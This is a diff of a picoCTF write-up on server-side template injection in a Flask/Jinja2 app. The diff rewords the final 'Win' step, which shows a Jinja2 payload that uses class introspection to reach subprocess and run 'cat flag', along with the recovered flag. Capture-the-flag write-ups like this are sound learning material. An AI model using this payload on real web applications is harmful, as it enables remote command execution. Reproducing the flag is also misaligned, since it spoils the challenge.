@@ -182,13 +182,16 @@ Werkzeug==3.0.3
 
 Seems like just details for the application to run, maybe a docker thing?
 
-Anyways, lets cat the flag with:
 
-__{{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}__
 
-__picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}__
+<h3>Win</h3>
+Lastly, lets using the linux read file command cat to open the flag file:
 
-Whoopee!
+Sending: __{{app.__class__.__mro__[1].__subclasses__()[356](['cat', 'flag'], stdout=-1).communicate()[0].decode()}}__
+
+- Returns __picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}__
+
+---------------------------------------------------------------------------------------------------------------------
 
 Applications used during CTF:
 -Kali Linux (OS)
